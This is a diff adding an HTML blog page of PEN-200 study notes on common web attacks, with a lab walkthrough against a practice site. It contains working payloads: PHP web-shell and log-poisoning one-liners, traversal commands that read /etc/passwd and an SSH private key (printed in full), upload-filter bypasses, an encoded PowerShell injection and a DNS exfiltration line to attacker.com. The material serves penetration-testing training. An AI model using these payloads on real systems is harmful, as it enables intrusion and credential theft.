@@ -1,0 +1,2235 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">web-common-attacks.html</h4>
+        <div class="git-file-meta">
+          <span>109 KB</span>
+          <span>site-output/blog/fragments/web-common-attacks.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>
+
+
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;web-common-attacks&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;PEN-200 Module 9 — Weaponizing Classic Web Bugs&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Aug 7, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;79 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;The notebook chapters for Module 9 include payload tables, encoding tricks, and lab-specific notes. This revision merges those details so you can move from detection to exploitation without guessing.&lt;/p&gt;
+&lt;h3&gt;Directory Traversal&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Identify file-include parameters (&lt;code&gt;download.php?file=report.pdf&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Inject traversal patterns:&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../../../../etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;..\..\..\windows\win.ini&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;URL-encoded variants: &lt;code&gt;%2e%2e%2f&lt;/code&gt;, &lt;code&gt;%2e%2e\&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Monitor server responses for directory errors or interesting strings.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;# Linux target
+curl -s &amp;quot;https://portal.acme.local/download?file=../../../../etc/passwd&amp;quot;
+
+# Automated brute force
+wfuzz -w wordlists/traversal-quick.txt -u https://portal.acme.local/download?file=FUZZ -mc 200
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Document which sequences the application blocks—reporting the control is as important as the bypass.&lt;/p&gt;
+&lt;h3&gt;File Inclusion&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;LFI ➜ Info Leakage:&lt;/strong&gt; read log files: &lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;, &lt;code&gt;/proc/self/environ&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Log Poisoning:&lt;/strong&gt; write PHP code into an access log (&lt;code&gt;User-Agent: &amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&lt;/code&gt;) then include the log.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Wrapper tricks:&lt;/strong&gt; &lt;code&gt;php://filter/convert.base64-encode/resource=index.php&lt;/code&gt; to leak source; &lt;code&gt;php://input&lt;/code&gt; for inline payloads.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;RFI:&lt;/strong&gt; host a PHP shell (&lt;code&gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&lt;/code&gt;) and reference it if &lt;code&gt;allow_url_fopen&lt;/code&gt; is enabled.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;# Poison log then trigger include
+curl -A &amp;quot;&amp;lt;?php system(&amp;#39;id&amp;#39;); ?&amp;gt;&amp;quot; https://portal.acme.local/index.php
+curl &amp;quot;https://portal.acme.local/include.php?page=../../../../var/log/apache2/access.log&amp;amp;cmd=id&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;File Upload Abuse&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Capture the upload request with Burp and note validation mechanisms (extension blacklist, content-type, size limits).&lt;/li&gt;
+&lt;li&gt;Attempt bypasses:&lt;ul&gt;
+&lt;li&gt;Double extensions: &lt;code&gt;shell.php.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Case manipulation: &lt;code&gt;ShElL.pHp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Null-byte injection: &lt;code&gt;shell.php%00.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;If uploads land in web-root, execute directly; otherwise, pivot by dropping &lt;code&gt;.htaccess&lt;/code&gt; to rewrite extensions.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;# Identify storage path via response or download
+curl -sI https://portal.acme.local/uploads/shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Command Injection&lt;/h3&gt;
+&lt;p&gt;Look for parameters embedded in shell commands (backup utilities, ping tests).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;; sleep 5
+&amp;amp; ping -c 3 192.168.49.1
+| powershell -nop -w hidden -e &amp;lt;payload&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Use timing payloads (&lt;code&gt;; ping -n 5 127.0.0.1&lt;/code&gt;) when output is suppressed.&lt;/li&gt;
+&lt;li&gt;For blind exfiltration, encode data into DNS (&lt;code&gt;nslookup $(whoami).attacker.com&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Reporting Checklist&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Provide successful payloads, proof-of-impact output, and sanitised screenshots.&lt;/li&gt;
+&lt;li&gt;Recommend resilient fixes: canonicalise paths, whitelist uploads, escape shell meta-characters, enforce least privilege on service accounts.&lt;/li&gt;
+&lt;li&gt;Note chaining opportunities (e.g., traversal ➜ credential theft ➜ lateral movement).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Classic bugs persist because the detection is easy but the exploitation nuance is often missing. Keep these detailed steps in your toolkit and the labs—and client networks—fall quicker.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h4&gt;Common Web Application Attacks&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Directory Traversal .&lt;/li&gt;
+&lt;li&gt;File Inclusion Vulnerabilities .&lt;/li&gt;
+&lt;li&gt;File Upload Attack Vulnerabilities .&lt;/li&gt;
+&lt;li&gt;Command Injection .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;9.1 Directory Traversal&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand absolute and relative paths .&lt;/li&gt;
+&lt;li&gt;Learn how to exploit directory traversal vulnerabilities .&lt;/li&gt;
+&lt;li&gt;Use encoding for special characters .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Absolute vs Relative Paths&lt;/h6&gt;
+&lt;ul&gt;
+&lt;li&gt;Absolute path.&lt;ul&gt;
+&lt;li&gt;Referenced starting with a &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Specifies Linux root fs.&lt;/li&gt;
+&lt;li&gt;Example:&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Relative path.&lt;ul&gt;
+&lt;li&gt;Referenced starting with a &lt;code&gt;../&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Moves path up one level closer to root fs.&lt;/li&gt;
+&lt;li&gt;Example (from &lt;code&gt;home&lt;/code&gt;):&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../../etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Number of &lt;code&gt;../&lt;/code&gt; sequences only valid until reaching root fs.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../../../../../../../../etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Result is same.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Identifying and Exploiting Directory Traversals&lt;/h6&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Directory_traversal_attack&quot;&gt;Directory Traversal attacks&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;AKA path traversal attacks.&lt;/li&gt;
+&lt;li&gt;Attack can be used to access sensitive files on a web server.&lt;/li&gt;
+&lt;li&gt;Typically occurs when a web application is not sanitizing user input.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Linux systems &lt;code&gt;/var/www/html/&lt;/code&gt; directory is often used as the web root.&lt;ul&gt;
+&lt;li&gt;When a web application displays a page, &lt;a href=&quot;http://example.com/file.html&quot;&gt;http://example.com/file.html&lt;/a&gt; for example, it will try to access /var/www/html/file.html.&lt;/li&gt;
+&lt;li&gt;Http link doesn&amp;#39;t contain any part of the path except the filename because the web root also serves as a base directory for a web server.&lt;/li&gt;
+&lt;li&gt;If a web application is vulnerable to directory traversal.&lt;ul&gt;
+&lt;li&gt;User may access files outside of the web root by using relative paths.&lt;/li&gt;
+&lt;li&gt;Thus accessing sensitive files like SSH private keys or configuration files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Identify Traversal Vulns&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hover over all buttons.&lt;ul&gt;
+&lt;li&gt;Checking all links.&lt;ul&gt;
+&lt;li&gt;Can be especially valuable.&lt;/li&gt;
+&lt;li&gt;May provide params or other data about app.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Navigate to all accessible pages.&lt;/li&gt;
+&lt;li&gt;Examine page source code.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://example.com/cms/login.php?language=en.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;login.php&lt;/code&gt; tells us the web application uses PHP.&lt;ul&gt;
+&lt;li&gt;Use this to develop assumptions about how to attack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;URL contains &lt;code&gt;language&lt;/code&gt; param with HTML page as value.&lt;ul&gt;
+&lt;li&gt;In a situation like this we should try to navigate to the file directly.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;https://example.com/cms/en.html&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;If we can open it, we confirm en.html is on the server.&lt;ul&gt;
+&lt;li&gt;We can now use that param to try other file names.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;URL contains dir called &lt;code&gt;cms&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Important, it indicates the web app is running in a sub dir of web root.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Case Study&lt;/strong&gt;
+Examining the Mountain Deserts web app.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;First page in browser, nav bar displays file names &lt;code&gt;index.php&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;We can conclude app uses PHP.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Hover over all buttons and links to collect info.&lt;ul&gt;
+&lt;li&gt;At the bottom we find a link labeled &amp;quot;Admin&amp;quot; leading to &lt;code&gt;admin.php&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;http://mountaindesserts.com/meteor/index.php?page=admin.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;When we click on the link, we receive an error message stating the page is currently under maintenance.&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Important detail for us&lt;/strong&gt;, since it reveals that information is shown on the same page.&lt;/li&gt;
+&lt;li&gt;In this case, we&amp;#39;ll make a few assumptions about how the web application could be developed to behave in such a way.&lt;/li&gt;
+&lt;li&gt;Example, when we open mountaindesserts.com/meteor/admin.php in our browser.&lt;ul&gt;
+&lt;li&gt;Notice the same message shown on the index.php page after clicking the &amp;quot;Admin&amp;quot; link.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We know the app uses PHP and a param called &amp;quot;page&amp;quot;.&lt;ul&gt;
+&lt;li&gt;Assume param is used to display different pages.&lt;/li&gt;
+&lt;li&gt;PHP uses $_GET2 to manage variables via a GET request.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Admin message indicates the web application includes the content of this page via the page parameter and displays it under the &amp;quot;Admin&amp;quot; link.&lt;ul&gt;
+&lt;li&gt;Now try to use &lt;code&gt;../&lt;/code&gt; to traverse directories in the potentially-vulnerable parameter.&lt;/li&gt;
+&lt;li&gt;Specify a relative path to &lt;code&gt;/etc/passwd&lt;/code&gt; to test the page parameter for directory traversal.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Page shows the contents of &lt;code&gt;/etc/passwd&lt;/code&gt;. We successfully leveraged the directory traversal vulnerability by using a relative path!&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Traversal vulns.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Mostly used for information gathering.&lt;/li&gt;
+&lt;li&gt;May give access to sensitive information.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;We server runs in context of &lt;code&gt;www-data&lt;/code&gt; in most cases.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;User context has limited access permissions on system.&lt;ul&gt;
+&lt;li&gt;However, users and admin typically set permissions to be very permissive.&lt;ul&gt;
+&lt;li&gt;As a result, we can check for presence of SSH keys and their access permissions.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;SSH keys are usually located in the home directory of a user in the &lt;code&gt;.ssh&lt;/code&gt; folder.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/passwd&lt;/code&gt; also contains the home directory paths of all users.&lt;/li&gt;
+&lt;li&gt;Output of &lt;code&gt;/etc/passwd&lt;/code&gt; shows a user called &lt;code&gt;offsec&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Specify a relative path for the vulnerable &amp;quot;page&amp;quot; parameter to try and display the contents of the user&amp;#39;s private key.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We successfully retrieved the private key for the &lt;code&gt;offsec&lt;/code&gt; user.&lt;ul&gt;
+&lt;li&gt;The output, we&amp;#39;ll notice that its formatting is a bit messy.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;As soon as we&amp;#39;ve identified a possible vulnerability, such as with the &amp;quot;page&amp;quot; parameter in this case, &lt;strong&gt;we should not rely on a browser for testing&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;We should mainly use tools such as Burp, cURL, or a programming language of our choice.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+...
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
+XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
+KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
+BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
+...
+lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
+bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
+hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
+iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
++2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Shows that the SSH private key is formatted better using curl than in the browser.&lt;ul&gt;
+&lt;li&gt;Copy the SSH private key beginning at &lt;code&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/code&gt; and ending at &lt;code&gt;-----END OPENSSH PRIVATE KEY-----&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Paste it into a file called &lt;code&gt;dt_key&lt;/code&gt; in the home directory for the &lt;code&gt;kali&lt;/code&gt; user.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Use the private key to connect to the target system via SSH on port 2222.&lt;ul&gt;
+&lt;li&gt;Use the &lt;code&gt;-i&lt;/code&gt; parameter to specify the stolen private key file and &lt;code&gt;-p&lt;/code&gt; to specify the port.&lt;/li&gt;
+&lt;li&gt;We&amp;#39;ll need to modify the permissions of the &lt;code&gt;dt_key&lt;/code&gt; file so that only the user &lt;code&gt;/&lt;/code&gt; owner can read the file.&lt;ul&gt;
+&lt;li&gt;If we don&amp;#39;t, the ssh program will throw an error stating that the access permissions are too open.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+The authenticity of host &amp;#39;[mountaindesserts.com]:2222 ([192.168.50.16]:2222)&amp;#39; can&amp;#39;t be established.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for &amp;#39;/home/kali/dt_key&amp;#39; are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+...
+
+kali@kali:~$ chmod 400 dt_key
+
+kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Directory Traversal on Windows&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux, we usually use the &lt;code&gt;/etc/passwd&lt;/code&gt; file to test directory traversal vulnerabilities.&lt;/li&gt;
+&lt;li&gt;On Windows, we can use the file &lt;code&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; to test directory traversal vulnerabilities.&lt;ul&gt;
+&lt;li&gt;Readable by all local users.&lt;/li&gt;
+&lt;li&gt;By displaying the file we can confirm the vuln exists.&lt;/li&gt;
+&lt;li&gt;It is more difficult to leverage a directory traversal vulnerability for system access on Windows than Linux.&lt;/li&gt;
+&lt;li&gt;N Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Check for private keys in their home directory, and use them to access the system via SSH.&lt;/li&gt;
+&lt;li&gt;This vector is not available on Windows and unfortunately, there is no direct equivalent.&lt;/li&gt;
+&lt;li&gt;Additionally, sensitive files are often not easily found on Windows without being able to list the contents of directories.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Once we gather information about the running application or service, we can research paths leading to sensitive files.&lt;ul&gt;
+&lt;li&gt;Example, if we learn that a target system is running the Internet Information Services (IIS) web server.&lt;ul&gt;
+&lt;li&gt;We can research its log paths and web root structure.&lt;/li&gt;
+&lt;li&gt;Microsoft documentation, we learn that the logs are located at &lt;code&gt;C:\inetpub\logs\LogFiles\W3SVC1\&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Another file we should always check when the target is running an IIS web server is &lt;code&gt;C:\inetpub\wwwroot\web.config&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;May contain sensitive information like passwords or usernames.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;RFC 17387 specifies to always use slashes in a URL, web applications on Windows may only be vulnerable to directory traversal using backslashes.&lt;/li&gt;
+&lt;li&gt;Always try to leverage both forward slashes and backslashes when examining a potential directory traversal vulnerability in a web application running on Windows.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;ul&gt;
+&lt;li&gt;*.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Directory Traversal Exercise Notes&lt;/h6&gt;
+&lt;p&gt;&lt;strong&gt;Linux Apache PHP Path Traversal&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../etc/passwd
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+    &amp;lt;head&amp;gt;
+...
+
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+offsec:x:1000:1000::/home/offsec:/bin/bash
+...
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../home/offsec/.ssh/id_rsa
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+    &amp;lt;head&amp;gt;
+        &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+        &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge,chrome=1&amp;quot;&amp;gt;
+        &amp;lt;title&amp;gt;Delicious Desserts from the Mountains&amp;lt;/title&amp;gt;
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
+XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
+KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
+BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
+UKJySQYqNFYTn3v1QUpM/ITPx3FWqSLmu0qoqSZmJT8CRqOqC/1E+H6nfnFEXCEB5Yft5/
+vwp11229VWfCqjVw1JHNF1NOY264chYCKIS7WRUIdamOFSm2rGubd9HkJAg0v0Cbm7Aq5T
+s3yNOfES3iOAISFy+W6/oXC09Ckk2/zEZCbdyKccIp4WOuSzM+ruCgLwR+iFphBObVXaRJ
+uiVH/S7JTGJqYLvc7uL2xr+jwu3FYb8me8gQCnmZAAAFiLDH5F6wx+ReAAAAB3NzaC1yc2
+EAAAGBAM/qRCiNTplC1UrPKIzv7GbHor9839nWx+i0smLo9wB5HMSDQ+1E8F3VE7VHniYW
+0wtIeUtk1hSdzhgdM4wqrBCNemR7GiiPZNgnzZqZdLInpJvWkBsQEqU4mDrCgmThaD1OpA
+ZCshIX4wfNhGtVaAL8eCeM+7DcdfsMnUPyn+3WsHfeUIwbqix/ZECBI5DhnwXpkzgMgnUw
+cc1IQ89bIj/bsqH6rgOb4ZjF1ssuvKSyl6YkKkxfn6BkBhvdDAV0uYcLJGIFCickkGKjRW
+E5979UFKTPyEz8dxVqki5rtKqKkmZiU/Akajqgv9RPh+p35xRFwhAeWH7ef78KdddtvVVn
+wqo1cNSRzRdTTmNuuHIWAiiEu1kVCHWpjhUptqxrm3fR5CQINL9Am5uwKuU7N8jTnxEt4j
+gCEhcvluv6FwtPQpJNv8xGQm3cinHCKeFjrkszPq7goC8EfohaYQTm1V2kSbolR/0uyUxi
+amC73O7i9sa/o8LtxWG/JnvIEAp5mQAAAAMBAAEAAAGBAJ86664e4lYP0Cf11TlyuZrRQ3
+vhV9KOYhV+5atIfXpYRsbdPNVm2asS93/69Ex5aHGYtIQgGrA5VtAy9Ppg59vZbiWr/ZGY
+mAPPH/BJnAygvbk3rq97NLxiRnuh4Zj+5AUnyAifZZ7julSMeeB1zS2USzUHDO8bOCPnOj
+4Cf6b3p7h1gzx6J27itVWNUT6w/Efb5YqkUfkL++vab0xLoERFrl3NDR3ocPK+eUysY37C
+488ynU5WYXrFf8QxGvbGt7ntnBhUT4uTaiNK7whXaAhfqzpTyuKvlkmWumcKzRJKvBYP63
+wGy2NihBJoY+jD8ZvLXEDwBXVrdgvdutIPORZcFS3sb5XDU1yTs/+iSHOnRhXmZG6p0v5u
+KeD637wgU8Mp9lsWbNyQF0FPinIaj1Jf5LZ0nxODFiZN0EUaaT2ihyOsFwxGR9JK0nDKhK
+Puq1x9stwKGAhLbTn0Hd6ZDkbONBhtajvX3VJ0DOjiHht4H7LEV5zvk60iiH/6mM83AQAA
